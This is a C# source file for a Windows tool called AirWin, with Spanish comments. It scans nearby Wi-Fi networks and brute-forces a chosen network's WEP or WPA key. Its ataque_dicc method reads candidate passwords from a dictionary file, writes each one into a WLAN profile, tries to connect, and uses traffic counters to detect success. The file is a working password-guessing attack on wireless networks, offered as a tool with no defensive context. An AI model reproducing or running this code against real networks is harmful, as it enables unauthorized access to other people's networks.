using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using NativeWifi;
using System.Threading;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;

/**
 * 
 * Clase creada para administrar Airwin sin necesidad imperiosa de Gui
 *
 **/
namespace AirWin
{
    class Airwin
    {

        private static int OS_Version;

        private string last_key;
        public int lineas;
        public int TestedKeys;
        public int  SkipedKeys;
        public string Resultat;
        WlanClient client = new WlanClient();
        private WlanClient.WlanInterface interfaz;
        private Wlan.WlanBssEntry REDBSS;
        private Wlan.WlanBssEntry[] lista_bss;
        private Wlan.WlanAvailableNetwork[] lista_redes;
        

        public Airwin()
        {
            lineas = 0;
            TestedKeys = 0;
            SkipedKeys = 0;
            OS_Version = System.Environment.OSVersion.Version.Major;
        }

        public int GetOsVersion()
        {
            return OS_Version;
        }

        public WlanClient.WlanInterface GetInterfazActual()
        {
            return interfaz;
        }

        public Wlan.WlanBssEntry GetSelectedRedBss()
        {
            return REDBSS;
        }


        public int GetNumberOfIntefaces()
        {
            WlanClient client = new WlanClient();
            return client.Interfaces.GetLength(0);

        }

        public void SetInterfaz(int index)
        {

            try
            {
                interfaz = client.Interfaces[index];
            }
            catch { }
        }

        public void SetBss(int index)
        {
            REDBSS = lista_bss[index];
        }

        public string GetNameOfInterface(int index)
        {
            return client.Interfaces[index].InterfaceDescription;
        }

        public string GetLastKey()
        {
            return last_key;
        }
        public long TotalKeys(){
            return lineas;
            }
        public long GetTestedKeys(){
            return TestedKeys;
            }

        public long GetSkipedKeys()
        {
            return SkipedKeys;
        }
        public bool ComparaSsid(Wlan.Dot11Ssid X, Wlan.Dot11Ssid Y)
        {
            int i = 0;
            if (X.SSIDLength != Y.SSIDLength) return false;
            while (i < X.SSIDLength & Y.SSID[i] == X.SSID[i])
            {
                i++;
            }

            return Y.SSID[i] == X.SSID[i];
        }

      /* public Wlan.WlanBssEntry[] GetBssList(int index){
            return  interfaz.GetNetworkBssList();
        }*/

        public void Scan(){
            interfaz.Scan();
        }

        public void preparaBssList(){
            lista_bss=interfaz.GetNetworkBssList();
        }
        public void preparaAvaiable()
        {
            lista_redes = interfaz.GetAvailableNetworkList(0);
        }

        public string Bss_Ssid(int index)
        {
           return  Encoding.ASCII.GetString(lista_bss[index].dot11Ssid.SSID);
        }
        public Wlan.Dot11Ssid Bss_Ssid_struct(int index)
        {
            return lista_bss[index].dot11Ssid;
        }


        public string Bss_Bssid(int index)
        {
            return ByteArrayToString(lista_bss[index].dot11Bssid);
        }
        public string Bss_rssi(int index)
        {
            return lista_bss[index].rssi.ToString();
        }
        public int GetLenghtBss()
        {
            return lista_bss.GetLength(0);
        }
        public string GetAuthAlgorithm(int index){
           
            return lista_redes[index].dot11DefaultCipherAlgorithm.ToString();

        }
        public string GetCipherAlgorithm(int index)
        {
            return lista_redes[index].dot11DefaultAuthAlgorithm.ToString();

        }

        public string GetConectable(int index)
        {
            return lista_redes[index].networkConnectable.ToString();

        }

        public string GetSignalQuality(int index)
        {
            return lista_redes[index].wlanSignalQuality.ToString();

        }




        public bool ataque_dicc(string nombre_red, string cifrado, string diccionario, string auth, int timeout, string resultat)
        {

            NetworkInterface Ethernet_Asociada = EthernetAsociada();
            long session = Ethernet_Asociada.GetIPv4Statistics().BytesReceived;
            bool connected = false;
             lineas = CountLinesInFile(diccionario);
            
            string profileXml;
            string key = "";
            string tipo_key = "";
            string index_key = "";


            //StreamWriter debug = new StreamWriter("debug");
            System.IO.StreamReader reader = new StreamReader(diccionario);

            while (!connected && !reader.EndOfStream)
            {   
                key = reader.ReadLine(); TestedKeys++;
              //  debug.WriteLine("#key:" + key);
                
                if (key_valid(key, cifrado))
                {
                    tipo_key = "passPhrase";
                    if (cifrado == "WEP")
                        tipo_key = "networkKey";
                    if (auth == "open") { index_key = "<keyIndex>0</keyIndex>"; }
                    /*
                    debug.WriteLine("#nombre_red:"+nombre_red);
                    debug.WriteLine("#auth:"+auth);
                    debug.WriteLine("#cifrado:"+cifrado);
                    debug.WriteLine("#tipo_key:"+tipo_key);
                    debug.WriteLine("#index_key:" + index_key);
                    debug.WriteLine("#Profile:");
                    */


                    last_key = key;


                    profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>{2}</authentication><encryption>{3}</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>{4}</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey>{5}</security></MSM></WLANProfile>", nombre_red, key, cifrado,auth, tipo_key, index_key);
                    //debug.WriteLine(profileXml);
                    //debug.Close();
                    interfaz.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);

                    interfaz.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, nombre_red);


                    /*profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>{2}</authentication><encryption>{3}</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>{4}</keyType><protected>false</protected><keyMaterial>{1}</keyMaterial></sharedKey>{5}</security></MSM></WLANProfile>", nombre_red, key, auth, cifrado, tipo_key, index_key);

                    interfaz.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
                    interfaz.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, nombre_red);
                    */
                    while (interfaz.InterfaceState == Wlan.WlanInterfaceState.Associating ||
                        interfaz.InterfaceState == Wlan.WlanInterfaceState.Authenticating)
                    {
                        Thread.Sleep(50);
                    }

                    Thread.Sleep(timeout * 1000);

                    if (Ethernet_Asociada.GetIPv4Statistics().BytesReceived - session > 3)
                    {
                        connected = true;
                    }
                    if (!connected)
                    {
                        interfaz.DeleteProfile(nombre_red); Thread.Sleep(50);

                    }
                }
                else SkipedKeys++;
            }
            if (connected)
            {
                Resultat = key;
                return true;
            }
            else { resultat = "No se encontro la clave"; return false; }

        }




        public int GetNetIndex(Wlan.Dot11Ssid X)
        {
            //Wlan.WlanAvailableNetwork ret = new Wlan.WlanAvailableNetwork();
            int long2 = lista_redes.GetLength(0);
            int i;
            for ( i = 0; i < long2; i++)
            {
                if (ComparaSsid(X, lista_redes[i].dot11Ssid))
                {
                    //ret = lista[i];
                    break;
                }
            }
            return i;

        }




       /* private Boolean Compara_string_Ssid(string X, Wlan.Dot11Ssid Y){

             int i = 0;
            if (X.Length != Y.SSIDLength) return false;
            while (i < X.Length & Y.SSID[i] == X[i])
            {
                i++;
            }
            return  Y.SSID[i] == X[i];
           
           }*/



        private Wlan.WlanAvailableNetwork devuelve_red(Wlan.Dot11Ssid X)
        {  
            Wlan.WlanAvailableNetwork ret = new Wlan.WlanAvailableNetwork();
            int long2 = lista_redes.GetLength(0);

            for (int i = 0; i < long2; i++)
            {
                if (ComparaSsid(X, lista_redes[i].dot11Ssid))
                {
                    ret = lista_redes[i];
                    break;
                }
            }
            return ret;


        }

        /************************* Funciones PRIVADAS **********************/
        //TRANSFORMAR CADENA DE BYTES EN UN STRING HEXA

        private static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        /*Funciones Privadas de la Clase creadas para el "ataque" */

        private bool key_valid(string key, string cifrado)
        {
            if (cifrado == "WEP" && (key.Length == 5 || key.Length == 13))
                return true;
            else if (cifrado != "WEP" && key.Length >= 7 && key.Length < 64)
                return true;
            else return false;

        }

        private static int CountLinesInFile(string f)
        {
            int count = 0;
            using (StreamReader r = new StreamReader(f))
            {
                string line;
                while ((line = r.ReadLine()) != null)
                {
                    count++;
                }

            }
            return count;
        }

        private NetworkInterface EthernetAsociada()
        {
            System.Net.NetworkInformation.NetworkInterface[] lista_ethernets = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
            int j = lista_ethernets.GetLength(0);
            for (int i = 0; i < j; i++)
            {
                if (String.Compare(lista_ethernets[i].Name, interfaz.InterfaceName,
                    StringComparison.OrdinalIgnoreCase) == 0)
                {
                    return lista_ethernets[i]; 
                }
            }
            return null;



        }

        //LAS SIGUIENTES FUNCIONES SE USAN PARA CONVERTIR LOS PARAMETROS DE LA CONEXION A PARAMETROS DEL PERFIL DE RED
        public string auth(string autenticate)
        {
            if (autenticate == "IEEE80211_Open") { return "open"; }
            if (autenticate == "IEEE80211_SharedKey") { return "shared"; }
            else if (autenticate == "WPA") { return "WPA"; }
            else if (autenticate == "WPA_PSK") { return "WPAPSK"; }
            else if (autenticate == "RSNA_PSK") { return "WPA2PSK"; }
            return "";

        }
        public string cif(string cipher)
        {
            if (cipher == "CCMP") { return "AES"; }
            else if (cipher == "TKIP") { return "TKIP"; }
            else if (cipher == "WEP") { return "WEP"; }
            return "";

        }

    }
}